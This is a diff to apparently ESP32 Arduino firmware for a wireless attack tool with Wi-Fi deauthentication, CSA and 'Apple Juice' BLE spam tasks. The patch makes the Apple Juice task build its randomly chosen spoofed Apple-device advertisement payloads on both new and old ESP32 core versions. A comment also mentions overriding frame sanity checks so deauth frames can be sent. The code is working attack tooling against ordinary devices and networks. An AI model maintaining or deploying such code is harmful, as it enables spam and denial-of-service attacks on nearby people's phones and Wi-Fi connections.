@@ -86,6 +86,7 @@ volatile LedState ledState = LS_OFF;
 #include <BLEDevice.h>
 #include <BLEUtils.h>
 #include <BLEServer.h>
+#include <esp_arduino_version.h>
 
 // ── FRAME SANITY OVERRIDE ─────────────────────────────────────────────────────
 // v3.0 HARD OVERRIDE — must return 0 or deauth never leaves radio
@@ -204,7 +205,6 @@ TaskHandle_t csaTaskHandle       = NULL;
 TaskHandle_t applejuiceTaskHandle = NULL;
 
 // Apple Juice forward (declared early so stopAllAttacks can see them)
-class BLEAdvertising;  // forward
 static BLEAdvertising* ajAdv = nullptr;
 static volatile bool ajRunning = false;
 
@@ -1252,12 +1252,18 @@ void applejuice_task(void* param) {
     int choice = esp_random() % 2;
     if (choice == 0) {
       int di = esp_random() % (sizeof(AJ_DEVICES)/sizeof(AJ_DEVICES[0]));
-      String payload((char*)AJ_DEVICES[di], 31);
-      oAdvertisementData.addData(payload);
+      #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
+        oAdvertisementData.addData(String((char*)AJ_DEVICES[di], 31));
+      #else
+        oAdvertisementData.addData(std::string((char*)AJ_DEVICES[di], 31));
+      #endif
     } else {
       int di = esp_random() % (sizeof(AJ_SHORT)/sizeof(AJ_SHORT[0]));
-      String payload((char*)AJ_SHORT[di], 23);
-      oAdvertisementData.addData(payload);
+      #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
+        oAdvertisementData.addData(String((char*)AJ_SHORT[di], 23));
+      #else
+        oAdvertisementData.addData(std::string((char*)AJ_SHORT[di], 23));
+      #endif
     }
 
     int at = esp_random() % 3;
